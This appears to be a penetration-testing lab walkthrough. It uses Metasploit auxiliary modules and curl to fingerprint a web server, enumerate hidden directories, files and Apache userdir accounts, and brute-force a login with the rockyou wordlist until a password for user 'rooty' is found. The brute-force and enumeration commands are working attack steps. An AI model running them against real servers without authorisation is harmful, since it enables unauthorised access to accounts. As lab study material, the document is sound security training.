## Overview

- **Web servers** (Apache, Nginx, IIS) serve content over **HTTP (port 80)** or **HTTPS (port 443)**.
- Use **auxiliary modules** to:
  - Identify server type/version
  - Extract HTTP headers
  - Discover hidden paths
  - Brute-force directories & credentials

---
## Step-by-Step Lab Workflow

### 1. Set Global Target

```msf
setg RHOSTS 192.168.1.10    # For modules that expect multiple hosts
setg RHOST 192.168.1.10     # For modules that expect single host
```

> ðŸ’¡ Some modules use `RHOST`, others use `RHOSTS` â€” setting both avoids errors.

---
### 2. Identify Web Server

```msf
use auxiliary/scanner/http/http_version
run
```

â†’ Returns server banner (e.g., `Apache/2.4.41`).

 If site uses HTTPS :
```msfset 
set SSL true
```

---
### 3. Analyze HTTP Headers

```msf
use auxiliary/scanner/http/http_header
run
```

â†’ Reveals security headers, server info, cookies, and potential misconfigurations.

---
### 4. Check `robots.txt`

```bash
curl http://192.168.1.10/robots.txt
```

Example output:
```
User-agent: *
Disallow: /data
Disallow: /secure
```

---
### 5. Test Disallowed Paths

#### a) Access `/data`
```bash
curl -s http://192.168.1.10/data
```

â†’ If <u>title</u> shows **"Index of /data"** â†’ **directory listing enabled**.  
â†’ Files are publicly accessible (e.g., `http://target/data/backup.zip`).

#### b) Access `/secure`
```bash
curl http://192.168.1.10/secure
```

â†’ Returns a **login form** â†’ requires credentials.

---
### 6. Discover Hidden Directories

```msf
use auxiliary/scanner/http/dir_scanner
set DICTIONARY /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
run
```

â†’ Finds paths **not listed in `robots.txt`** (because `robots.txt` is advisory â€” attackers ignore it).

> âœ… These paths **do work** â€” theyâ€™re just not meant for crawlers.

---
### 7. Brute-Force Files

```msf
search name:http type:auxiliary files_dir
use auxiliary/scanner/http/files_dir
run
```

â†’ Discovers common files (`backup.sql`, `.env`, `config.php`).

---
### 8. Brute-Force Login (`/secure`)

```msf
use auxiliary/scanner/http/http_login
set AUTH_URI /secure
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/rockyou.txt
set VERBOSE false    # Suppress failed attempts
run
```

â†’ No success â†’ try different username list.

---
### 9. Enumerate Valid Usernames (Apache Userdir)
Some servers expose user directories via `/~username`.

```msf
search apache_userdir_enum
use auxiliary/scanner/http/apache_userdir_enum
run
```

â†’ Module detects valid users by **comparing HTTP response codes/sizes** (e.g., 200 vs 404).

â†’ Found user: `rooty`

---
### 10. Final Credential Brute-Force

```bash
echo "rooty" > user.txt
```
```msf
use auxiliary/scanner/http/http_login
set USER_FILE user.txt
set PASS_FILE rockyou.txt
set AUTH_URI /secure
run
```

â†’ **Success!** Valid password found.

> ðŸ’¡ Always combine directory discovery, file enumeration, and targeted brute-forcing.

